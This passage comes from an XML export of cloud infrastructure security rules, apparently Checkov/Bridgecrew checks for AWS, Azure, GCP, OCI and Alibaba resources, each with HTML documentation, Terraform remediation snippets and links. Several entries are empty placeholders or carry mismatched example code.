<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-cosmosdb-has-local-authentication-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-cosmosdb-has-local-authentication-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-cosmosdb-has-local-authentication-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_257</key>
    <name>Ensure AWS Codecommit branch changes have at least 2 approvals</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-codecommit-branch-changes-has-less-than-2-approvals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-codecommit-branch-changes-has-less-than-2-approvals"></div>AWS Codecommit branch changes has less than 2 approvals</div><a aria-label="Skip link to AWS Codecommit branch changes has less than 2 approvals" class="heading-anchor-icon fa fa-anchor" href="#aws-codecommit-branch-changes-has-less-than-2-approvals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The best practice for merging new code into a code base is to have at least two reviewers. AWS CodeCommit can enforce this policy.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>In the AWS console, go to <strong>CodeCommit</strong>.</li>
<li>Select <strong>Approval Rule Templates</strong> and then <strong>Create Template</strong>.</li>
<li>Under <strong>Number of approvals needed</strong>, add at least two approvals.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">resource "aws_codecommit_approval_rule_template" "example" {
...
  content = &lt;&lt;EOF
{
    "Version": "2018-11-08",
    "DestinationReferences": ["refs/heads/master"],
    "Statements": [{
        "Type": "Approvers",
+        "NumberOfApprovalsNeeded": 2,
        "ApprovalPoolMembers": ["arn:aws:sts::123456789012:assumed-role/CodeCommitReview/*"]
    }]
}
EOF
...
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-codecommit-branch-changes-have-at-least-2-approvals' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-codecommit-branch-changes-have-at-least-2-approvals</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-codecommit-branch-changes-have-at-least-2-approvals' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_22</key>
    <name>Ensure OCI security groups rules do not allow ingress from 0.0.0.0/0 to port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-security-groups-rules-allows-ingress-from-00000-to-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-security-groups-rules-allows-ingress-from-0-0-0-0-0-to-port-22"></div>OCI security groups rules allows ingress from 0.0.0.0/0 to port 22</div><a aria-label="Skip link to OCI security groups rules allows ingress from 0.0.0.0/0 to port 22" class="heading-anchor-icon fa fa-anchor" href="#oci-security-groups-rules-allows-ingress-from-00000-to-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-security-groups-rules-do-not-allow-ingress-from-00000-to-port-22' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-security-groups-rules-do-not-allow-ingress-from-00000-to-port-22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-security-groups-rules-do-not-allow-ingress-from-00000-to-port-22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_32</key>
    <name>Ensure Alibaba Cloud launch template data disks are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-launch-template-data-disks-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-launch-template-data-disks-are-not-encrypted"></div>Alibaba Cloud launch template data disks are not encrypted</div><a aria-label="Skip link to Alibaba Cloud launch template data disks are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-launch-template-data-disks-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-launch-template-data-disks-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-launch-template-data-disks-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-launch-template-data-disks-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_36</key>
    <name>Ensure Alibaba Cloud RDS instance has log_disconnections enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-rds-instance-does-not-have-log_disconnections-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-rds-instance-does-not-have-log-disconnections-enabled"></div>Alibaba Cloud RDS instance does not have log_disconnections enabled</div><a aria-label="Skip link to Alibaba Cloud RDS instance does not have log_disconnections enabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-rds-instance-does-not-have-log_disconnections-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_210</key>
    <name>Ensure AWS Batch Job is not defined as a privileged container</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-batch-job-is-defined-as-a-privileged-container"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-batch-job-is-defined-as-a-privileged-container"></div>AWS Batch Job is defined as a privileged container</div><a aria-label="Skip link to AWS Batch Job is defined as a privileged container" class="heading-anchor-icon fa fa-anchor" href="#aws-batch-job-is-defined-as-a-privileged-container"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-batch-job-is-not-defined-as-a-privileged-container' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-batch-job-is-not-defined-as-a-privileged-container</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-batch-job-is-not-defined-as-a-privileged-container' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_215</key>
    <name>Ensure AWS Appsync API Cache is encrypted in transit</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsync-api-cache-is-not-encrypted-in-transit"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-appsync-api-cache-is-not-encrypted-in-transit"></div>AWS Appsync API Cache is not encrypted in transit</div><a aria-label="Skip link to AWS Appsync API Cache is not encrypted in transit" class="heading-anchor-icon fa fa-anchor" href="#aws-appsync-api-cache-is-not-encrypted-in-transit"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-in-transit' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-in-transit</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-in-transit' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_201</key>
    <name>Ensure AWS MemoryDB is encrypted at rest by AWS' Key Management Service KMS using CMKs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-memorydb-is-not-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-memory-db-is-not-encrypted-at-rest-by-aws-key-management-service-kms-using-cm-ks"></div>AWS MemoryDB is not encrypted at rest by AWS' Key Management Service KMS using CMKs</div><a aria-label="Skip link to AWS MemoryDB is not encrypted at rest by AWS' Key Management Service KMS using CMKs" class="heading-anchor-icon fa fa-anchor" href="#aws-memorydb-is-not-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies MemoryDB which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your MemoryDB data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_memorydb_cluster"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-memorydb-cluster"></div>Resource: aws_memorydb_cluster</div><a aria-label="Skip link to Resource: aws_memorydb_cluster" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_memorydb_cluster"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-kms_key_arn"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-kms-key-arn"></div>Arguments: kms_key_arn</div><a aria-label="Skip link to Arguments: kms_key_arn" class="heading-anchor-icon fa fa-anchor" href="#arguments-kms_key_arn"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_memorydb_cluster" "pass" {
  acl_name                 = "open-access"
  name                     = "my-cluster"
  node_type                = "db.t4g.small"
  num_shards               = 2
  security_group_ids       = [aws_security_group.example.id]
  snapshot_retention_limit = 7
  subnet_group_name        = aws_memorydb_subnet_group.example.id
  kms_key_arn              = aws_kms_key.example.arn
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-memorydb-is-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-memorydb-is-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-memorydb-is-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_145</key>
    <name>Ensure Azure Function app uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-function-app-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-function-app-does-not-use-the-latest-version-of-tls-encryption"></div>Azure Function app does not use the latest version of TLS encryption</div><a aria-label="Skip link to Azure Function app does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-function-app-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-function-app-uses-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-function-app-uses-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-function-app-uses-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_106</key>
    <name>Ensure GCP Google compute firewall ingress does not allow unrestricted HTTP port 80 access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-google-compute-firewall-ingress-allows-unrestricted-http-port-80-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-google-compute-firewall-ingress-allows-unrestricted-http-port-80-access"></div>GCP Google compute firewall ingress allows unrestricted HTTP port 80 access</div><a aria-label="Skip link to GCP Google compute firewall ingress allows unrestricted HTTP port 80 access" class="heading-anchor-icon fa fa-anchor" href="#gcp-google-compute-firewall-ingress-allows-unrestricted-http-port-80-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-http-port-80-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-http-port-80-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-http-port-80-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_220</key>
    <name>Ensure AWS Cloudsearch uses HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudsearch-does-not-use-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloudsearch-does-not-use-https"></div>AWS Cloudsearch does not use HTTPS</div><a aria-label="Skip link to AWS Cloudsearch does not use HTTPS" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudsearch-does-not-use-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>CloudSearch is a managed search service for your web service. CloudSearch Domains allow you to enforce that requests come over HTTPS, encrypting those requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>In the AWS Console, go to <strong>CloudSearch</strong>.</li>
<li>Select the domain you wish to edit.</li>
<li>Under <strong>Domain configuration</strong>, next to <strong>HTTPS options</strong>, select <strong>Edit</strong>.</li>
<li>Enable <strong>Toggle HTTPS options</strong>.</li>
<li>Select <strong>Submit</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">resource "aws_cloudsearch_domain" "example" {
...
+   endpoint_options {
+     enforce_https = true
+   }
...
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_134</key>
    <name>Ensure Azure Cognitive Services accounts disable public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cognitive-services-accounts-enable-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cognitive-services-accounts-enable-public-network-access"></div>Azure Cognitive Services accounts enable public network access</div><a aria-label="Skip link to Azure Cognitive Services accounts enable public network access" class="heading-anchor-icon fa fa-anchor" href="#azure-cognitive-services-accounts-enable-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
